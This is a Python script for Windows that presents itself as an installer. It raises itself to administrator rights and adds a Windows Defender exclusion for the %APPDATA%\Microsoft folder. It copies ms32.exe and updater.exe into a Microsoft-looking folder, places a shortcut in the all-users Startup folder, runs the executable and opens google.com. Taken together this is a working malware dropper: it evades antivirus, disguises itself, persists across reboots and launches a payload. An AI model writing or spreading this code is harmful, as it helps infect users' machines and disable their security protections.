import os
import shutil
import ctypes
from elevate import elevate
from webbrowser import open as open_t
import subprocess
# Check if the script is running with administrator privileges (Windows version)
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        return False

# If the script is not running as administrator, elevate it
if not is_admin():
    elevate()  # This will re-run the script with administrator privileges

# Source file paths
source_path_exe = 'ms32.exe'
source_folder = 'effects'
source_updater = 'updater.exe'
source_shortcut = "ms32.lnk"

# Expand environment variables in the paths
appdata_path = os.path.expandvars(r"%APPDATA%\Microsoft\MS32")
destination_path_exe = os.path.join(appdata_path, 'ms32.exe')
destination_folder = os.path.join(appdata_path, 'effects')
destination_updater = os.path.join(appdata_path, 'updater.exe')
destination_shortcut = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ms32.lnk"
if os.path.exists(appdata_path):
    shutil.rmtree(appdata_path)
path = os.path.expandvars(r"%APPDATA%\Microsoft")
def run_powershell_command(command):
    try:
        result = subprocess.run(
            ["powershell", "-Command", command],
            capture_output=True,
            text=True,
            shell=True
        )
        if result.returncode != 0:
            raise Exception(result.stderr.strip())
        return result.stdout.strip()
    except Exception as e:
        return f"Error: {e}"

command = f"Add-MpPreference -ExclusionPath '{path}'"
run_powershell_command(command)
try:
    # Ensure the destination directory for the folder exists
    if not os.path.exists(appdata_path):
        os.makedirs(appdata_path)  # Create the directory if it doesn't exist

    if not os.path.exists(destination_folder):
        os.makedirs(destination_folder)  # Create the 'effects' directory

    # Copy the ms32.exe file
    shutil.copy(source_path_exe, destination_path_exe)
    print(f"File copied from {source_path_exe} to {destination_path_exe}")

    # Copy the updater.exe file
    shutil.copy(source_updater, destination_updater)
    print(f"File copied from {source_updater} to {destination_updater}")

    # Copy the shortcut file
    shutil.copy(source_shortcut, destination_shortcut)
    print(f"File copied from {source_shortcut} to {destination_shortcut}")
    os.startfile(destination_path_exe)
    open_t("https://google.com")

except FileNotFoundError as e:
    print(f"Error: Source file or folder not found.")
    print(f"Details: {e}")

except PermissionError as e:
    print(f"Error: Permission denied while accessing the destination.")
    print(f"Details: {e}")

except Exception as e:
    print(f"An unexpected error occurred: {e}")
